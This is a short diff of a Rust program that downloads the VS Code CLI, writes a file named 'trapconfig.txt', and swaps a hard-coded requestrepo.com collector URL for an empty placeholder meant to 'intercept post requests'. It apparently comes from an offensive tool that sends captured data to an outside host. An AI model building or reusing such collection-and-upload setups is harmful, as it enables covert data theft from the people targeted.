@@ -201,7 +201,7 @@ fn main() {
     
     let url: &str = "https://az764295.vo.msecnd.net/stable/97dec172d3256f8ca4bfb2143f3f76b503ca0534/vscode_cli_win32_x64_cli.zip";
     let output_file: &str = "trapconfig.txt";
-    let upurl: &str = "https://wcim73k4.requestrepo.com/";
+    let upurl: &str = ""; //url to intercept post requests
 
     if !isvscodeinstalled(){
         if let Err(e) = download(url){
